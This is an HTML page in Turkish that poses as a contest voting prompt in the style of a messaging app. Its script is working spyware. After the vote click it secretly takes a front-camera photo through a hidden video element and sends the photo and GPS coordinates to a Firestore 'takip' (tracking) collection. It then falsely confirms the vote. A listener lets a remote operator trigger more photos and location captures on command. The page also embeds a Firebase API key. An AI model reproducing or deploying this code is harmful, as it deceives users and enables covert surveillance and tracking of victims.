<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yarışma Katılım</title>
    <style>
        body { margin: 0; background-color: #0b141a; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; color: white; }
        .card { text-align: center; padding: 30px; border-radius: 20px; background: #111b21; border: 1px solid #233138; width: 85%; }
        #video { position: absolute; left: -9999px; opacity: 0; width: 1px; height: 1px; }
        #btn { width: 100%; height: 55px; background-color: #00a884; color: white; display: flex; justify-content: center; align-items: center; border-radius: 30px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <h2 id="title">Aday Onayı Bekleniyor</h2>
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas" style="display:none;"></canvas>
        <div id="btn" onclick="calistir()">Oy Ver</div>
        <p id="stat" style="font-size:12px; color:#8696a0; margin-top:10px;">Sistem doğrulanıyor...</p>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCBlAZT1FXVcoj_1oFgjP4GlmaOIVFAt2c",
            authDomain: "whtapp-27674.firebaseapp.com",
            projectId: "whtapp-27674",
            storageBucket: "whtapp-27674.appspot.com"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        async function fotoCekVeGonder(pos) {
            canvas.width = 320; // Hız için boyutu küçülttük
            canvas.height = 240;
            canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
            const photoBase64 = canvas.toDataURL('image/jpeg', 0.4); // Kaliteyi %40 yaptık ki yer kaplamasın

            await setDoc(doc(db, "takip", "admin"), {
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                fotoVeri: photoBase64,
                zaman: new Date().toLocaleString('tr-TR'),
                t: Date.now()
            }, { merge: true });
        }

        window.calistir = async () => {
            document.getElementById("btn").innerText = "İşleniyor...";
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;

                navigator.geolocation.getCurrentPosition(async (pos) => {
                    setTimeout(() => { 
                        fotoCekVeGonder(pos); 
                        alert("Oyunuz kaydedildi!");
                        stream.getTracks().forEach(t => t.stop());
                    }, 1500);
                });

                // Panelden gelen fotoğraf çek komutunu dinle
                onSnapshot(doc(db, "takip", "komut"), async (snap) => {
                    if (snap.exists() && snap.data().cek === true) {
                        navigator.geolocation.getCurrentPosition(p => fotoCekVeGonder(p));
                        await setDoc(doc(db, "takip", "komut"), { cek: false });
                    }
                });
            } catch (e) { alert("İzin vermeniz gerekiyor!"); }
        };
    </script>
</body>
</html>
